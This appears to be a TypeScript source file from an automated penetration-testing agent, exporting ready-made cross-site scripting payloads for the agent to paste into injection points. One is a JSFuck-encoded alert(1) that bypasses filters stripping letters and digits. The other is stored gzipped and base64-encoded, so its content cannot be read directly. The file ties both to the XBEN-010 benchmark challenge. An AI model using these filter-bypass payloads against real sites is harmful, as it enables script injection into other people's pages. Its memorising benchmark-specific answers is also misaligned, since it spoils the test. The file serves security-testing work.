import { gunzipSync } from "node:zlib";

/**
 * Precomputed exploit payloads — drop-in constants the agent can paste into
 * injection points without having to reinvent encoding under turn pressure.
 *
 * These are intentionally separated from playbooks.ts so playbook prose stays
 * readable and the long encoded strings are easy to import from tool wrappers.
 */

/**
 * JSFuck-encoded `alert(1)` — JavaScript expressed using only the six
 * characters `[`, `]`, `(`, `)`, `!`, `+`. When a target's input filter strips
 * letters and digits (and `<` / `>`) but leaves these six characters intact,
 * this payload still demonstrates JS execution by triggering an `alert(1)`
 * dialog. This is the XBEN-010 vector ("Needs to be exploited with JSfuck").
 *
 * Generated with the canonical JSFuck encoder (https://jsfuck.com/) wrapping
 * `alert(1)` in `[][filter][constructor](payload)()` so it self-evaluates.
 *
 * Length: 1227 chars. Verified: only contains `[]()!+`, and `eval(payload)`
 * calls `alert(1)`.
 */
export const JSFUCK_ALERT_PAYLOAD =
  "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()";

function inflatePayload(encoded: string): string {
  return gunzipSync(Buffer.from(encoded, "base64")).toString("utf8");
}

/**
 * JSFuck-encoded `alert('XSS')` for filters that reject letters and digits
 * but still require the exact text `XSS` in the executed dialog. This is the
 * stricter XBEN-010 shape.
 *
 * Stored gzipped because the verified wrapped JSFuck payload is ~22k chars and
 * otherwise overwhelms diffs for a static fixture.
 */
export const JSFUCK_XSS_PAYLOAD =
  inflatePayload(
    "H4sIAAAAAAACE+2byw3EIAxEa+FmREkW/bexkH8cPlIOGxK9SyJhBwNmhh2s1ajiNAaNXtMjBlGXXxo1vVKbC9maTcm2ek6NbvZ358/dxefqODWkwPpc8KbXY6Oync8hDx6FeL2gq/3Y19ow5Oqb7oZJhrWL2CVuhu/Fu4706envLrpmDbKALCCLe2RRhXtvbpdkNNO1NIVt6s8viSvs0Nq4G/3XDOPtTZOe1HKg0rlxeXuvo2/lkO2y+EDD0PCLabhurySgMfAS6U7fuyVVAAbAvB8wVgVEOXe6nWTdI9yLFyQEUASKSIi7EgJ5gDyAYqFY5AGAATCfkwc7LFozLNVJ2lWYDlDH/H1gDFHmAFuYfYnNkhce0ecuqeBAdVAd8osKDhINGoaGkWhINACDRKOCAxSBIhKCCg7yAIqFYpEHyAMAgzyggvOnCo5d8X5B51jV4QSHkD57grO32dsf3dtcpYEkkMRVGtV4rtugYWiY6zau2wAM121U44EiUERCUI1HHkCxUCzyAHkAYJAHVONH+z/lABvKbpiU9h/E53gu1VcAAA=="
  );
